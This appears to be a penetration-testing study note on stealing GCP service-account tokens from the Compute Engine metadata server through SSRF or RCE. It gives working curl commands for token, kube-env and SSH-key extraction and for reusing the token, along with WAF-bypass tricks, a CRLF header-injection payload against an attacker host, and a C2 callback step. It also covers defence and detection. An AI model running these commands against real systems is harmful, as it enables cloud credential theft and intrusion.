---
tags: [cloud, gcp, metadata, ssrf, credential-theft, web]
difficulty: intermediate
module: "37 - Cloud Infrastructure"
topic: "37.15 GCP Metadata"
---

# GCP Metadata Server — Credential Theft

The Google Cloud Platform (GCP) Metadata Server is a fundamental component of the Compute Engine architecture. It provides instances with critical configuration data, network information, and, most importantly, identity credentials in the form of Service Account tokens. When an attacker is able to exploit a Server-Side Request Forgery (SSRF) vulnerability or gain remote code execution on a GCP instance, the Metadata Server becomes a prime target for credential theft, leading to lateral movement and privilege escalation within the cloud environment.

## 1. Architectural Deep Dive

The GCP Metadata Server operates as a local link-local HTTP service accessible only from within the virtual machine instance.

*   **IP Address**: `169.254.169.254` or `metadata.google.internal`
*   **Protocol**: HTTP (Port 80)
*   **Required Header**: `Metadata-Flavor: Google`

Unlike older implementations of AWS (IMDSv1), GCP has strictly enforced the inclusion of the `Metadata-Flavor: Google` HTTP header for all requests to the `v1` API. This acts as a robust mitigation against simple SSRF attacks where the attacker cannot control the HTTP headers.

### ASCII Architecture Diagram

```text
+---------------------------------------------------+
|               GCP Compute Instance                |
|                                                   |
|   +-------------------+                           |
|   | Vulnerable Web App|---(1) SSRF Triggered      |
|   |                   |    (Attacker Controls URL)|
|   +-------------------+                           |
|            |                                      |
|            | (2) GET /computeMetadata/v1/...      |
|            |     Header: Metadata-Flavor: Google  |
|            v                                      |
|   +===========================================+   |
|   |         Link-Local Virtual Router         |   |
|   |             (169.254.169.254)             |   |
|   +===========================================+   |
+--------------------|------------------------------+
                     |
                     | (3) Intercepts Traffic
                     v
+---------------------------------------------------+
|               GCP Metadata Server                 |
| - Validates IP source                             |
| - Validates 'Metadata-Flavor' header              |
| - Retrieves Identity Token from IAM               |
+---------------------------------------------------+
                     |
                     | (4) JSON Response (Token)
                     v
              Attacker via SSRF
```

## 2. The Attack Mechanism

To compromise a GCP environment via the Metadata server, an attacker typically follows a structured path:

1.  **Vulnerability Discovery**: Identifying an SSRF, RCE, or XXE vulnerability that allows HTTP requests to be issued from the server.
2.  **Header Injection/Bypass**: Injecting the required `Metadata-Flavor: Google` header. If full header control is impossible, attackers may look for legacy endpoints (now mostly deprecated) or HTTP parser desynchronization flaws.
3.  **Token Extraction**: Querying the specific metadata path that yields the OAuth 2.0 access token for the attached service account.
4.  **Token Validation & Scope Enumeration**: Using the token to determine its identity and the permissions (scopes) granted to it.
5.  **Environment Exploitation**: Leveraging the token against GCP APIs (Resource Manager, Compute, Storage) to exfiltrate data or escalate privileges.

### 2.1 The Target Endpoints

The most critical endpoints within the GCP Metadata Server for credential theft are:

*   **List Service Accounts**: `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/`
*   **Get Token (Default)**: `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`
*   **Get Project Info**: `http://metadata.google.internal/computeMetadata/v1/project/project-id`

## 3. Exploitation Methodology

### 3.1 Direct Extraction via RCE or SSRF (With Header Control)

If the attacker has Command Execution or an SSRF with header manipulation capabilities, the token can be extracted directly using a tool like `curl`:

```bash
# Basic token extraction using curl
curl -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
```

**Expected JSON Response:**
```json
{
  "access_token": "ya29.c.c0AY_VpTh...[REDACTED]...",
  "expires_in": 2450,
  "token_type": "Bearer"
}
```

### 3.2 Bypassing Header Restrictions in SSRF

If the vulnerable application only allows URL input and does not allow custom headers, direct exploitation of the `v1` API is impossible. However, historical bypasses and edge cases include:

*   **v1beta1 API (Deprecated)**: Previously, GCP allowed queries without headers to `/computeMetadata/v1beta1/`. Google has effectively disabled this across modern infrastructure, but it's worth checking in misconfigured or extremely old environments.
*   **X-Google-Metadata-Request**: Alternatively, the header `X-Google-Metadata-Request: True` is also accepted. Some application WAFs might only block `Metadata-Flavor`.
*   **Kube-Env Extraction**: Sometimes, if the instance is a GKE node, the `kube-env` attribute may contain sensitive bootstrapping certificates and keys.

```bash
curl -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/attributes/kube-env"
```

### 3.3 Validating the Stolen Token

Once the token (`ya29...`) is obtained, the attacker must determine the identity and permissions of the compromised account. This is done by querying the Google OAuth2 API.

```bash
curl "https://oauth2.googleapis.com/tokeninfo?access_token=ya29.c.c0AY_VpTh..."
```

**Response Breakdown:**
```json
{
  "issued_to": "1049384950394-compute@developer.gserviceaccount.com",
  "audience": "1049384950394-compute@developer.gserviceaccount.com",
  "scope": "https://www.googleapis.com/auth/cloud-platform",
  "expires_in": 2043,
  "access_type": "online"
}
```
*Notice the `scope` attribute.* If it says `https://www.googleapis.com/auth/cloud-platform`, the token has full API access based on the IAM roles assigned to the service account.

### 3.4 Using the Token for Lateral Movement

The token can be passed directly to the `gcloud` CLI or used in raw REST API requests.

**Method A: REST API (Example: Listing Storage Buckets)**
```bash
curl -H "Authorization: Bearer ya29.c.c0AY_VpTh..." \
     "https://storage.googleapis.com/storage/v1/b?project=YOUR_PROJECT_ID"
```

**Method B: Authenticating via gcloud CLI (Living off the Land)**

Attackers rarely want to construct manual REST calls for complex operations. They can import the token into the `gcloud` tool on their local machine.

*Note: `gcloud` doesn't natively support logging in with just an access token, but you can pass it per command.*

```bash
gcloud compute instances list --project=target-project-123 \
  --access-token-file=<(echo "ya29.c.c0AY_VpTh...")
```

## 4. Deep Dive: Scopes vs. IAM Roles

A common point of confusion during exploitation is the intersection of **Access Scopes** and **IAM Roles**.
Even if a Service Account has the IAM role `roles/owner` (full administrative control over the project), the actions it can perform on a specific Compute Engine instance are limited by the **Access Scopes** defined when the VM was created.

*   **IAM Role**: What the identity *is allowed to do* globally in GCP.
*   **Access Scope**: What the instance *is allowed to request* using the identity.

If an instance is created with the default access scope (which restricts Compute API to read-only and blocks Storage write), the attacker *cannot* perform write operations using the stolen token, regardless of the IAM role.

**Default Restricted Scopes include:**
*   `https://www.googleapis.com/auth/devstorage.read_only`
*   `https://www.googleapis.com/auth/logging.write`
*   `https://www.googleapis.com/auth/monitoring.write`

*Attackers hunt for instances with the `cloud-platform` scope, which bypasses scope restrictions and relies entirely on IAM permissions.*

## 5. Defense and Remediation

Defending against Metadata credential theft requires a defense-in-depth approach spanning application security and cloud configuration.

1.  **Eliminate SSRF/RCE**: The root cause is the application vulnerability. Employ secure coding practices, input validation, and parameterization to prevent arbitrary outbound requests.
2.  **Metadata Concealment (GKE)**: In Google Kubernetes Engine (GKE), use Workload Identity. This replaces the default compute metadata server with the GKE metadata server, heavily restricting what pods can query and preventing access to the node's underlying service account.
3.  **VPC Service Controls**: Implement VPC Service Controls to create security perimeters around GCP resources. Even if a token is stolen, API requests originating from outside the trusted VPC boundary (e.g., the attacker's laptop) will be denied.
4.  **Restrict Access Scopes**: Never deploy VMs with the `Allow full access to all Cloud APIs` scope (`cloud-platform`). Use granular, least-privilege scopes.
5.  **Least Privilege IAM**: Do not use the Default Compute Service Account (`[PROJECT_NUMBER]-compute@developer.gserviceaccount.com`). Create dedicated custom service accounts for each application instance with only the exact permissions needed.

## 6. Forensics and Detection

Detecting this attack path involves monitoring both network traffic (if possible) and Cloud Audit Logs.

*   **VPC Flow Logs**: Look for unexpected internal traffic originating from the web application infrastructure targeting `169.254.169.254`.
*   **Cloud Audit Logs**:
    *   Monitor for high-frequency or anomalous API calls originating from a Service Account.
    *   Look for the `callerIp` field in the audit logs. If a Service Account token is typically used by a VM with IP `10.1.2.3`, but API calls suddenly originate from a public residential IP or a VPN node, the token has been exfiltrated.
*   **Alerting on Anomaly**: Create SIEM rules to trigger on `google.cloud.audit.AuditLog` events where the principal is a service account, but the source IP is outside known VPC CIDR blocks.

## Chaining Opportunities

*   **[[16 - GCP Cloud Functions — Privilege Escalation]]**: Stolen tokens can be used to modify or deploy malicious Cloud Functions, granting persistent RCE in a serverless environment.
*   **[[17 - GCP Compute Engine — Default Service Account Abuse]]**: If the stolen token belongs to the Default Compute Service Account, it inherently possesses the Editor role in older projects, opening massive privilege escalation vectors.
*   **[[01 - SSRF (Server-Side Request Forgery)]]**: The primary vector to initiate this attack class from an external perspective.

## Related Notes

*   [[08 - AWS IMDSv1 vs IMDSv2]] - A comparative look at how AWS handles metadata security versus GCP.
*   [[09 - IAM Privilege Escalation Fundamentals]] - General principles of cloud IAM abuse.
*   [[12 - Container Breakouts]] - Methods to reach the host metadata server from an isolated Docker container.

## Appendix A: Penetration Testing Playbook & Cheat Sheet

When conducting a black-box or gray-box penetration test against a GCP environment, the following step-by-step checklist should be utilized to systematically enumerate and exploit the Metadata Server.

### Phase 1: Vulnerability Identification
1.  **Identify SSRF Vectors**: Map all application inputs that process URLs, fetch external resources (like webhooks or PDF generation), or handle XML (for XXE).
2.  **Test for Header Injection**: Send a test request to an arbitrary Burp Collaborator or interactsh payload to verify if custom headers can be injected.
    *   Payload: `http://attacker.com/test\r\nMetadata-Flavor: Google`
3.  **Bypass WAFs**: If `169.254.169.254` is blocked, attempt decimal encoding (`2852039166`), octal encoding, or DNS rebinding techniques.

### Phase 2: Metadata Enumeration
1.  **Project Details**: `curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/project-id`
2.  **SSH Keys**: `curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys`
3.  **Instance Tags**: `curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/tags` (Useful for finding lateral movement targets).

### Phase 3: Exploitation and Lateral Movement
1.  Extract token.
2.  Import token to local gcloud environment.
3.  Enumerate privileges.
4.  If privileges allow, deploy a new instance with a startup script that connects back to a C2 framework (e.g., Mythic or Cobalt Strike).

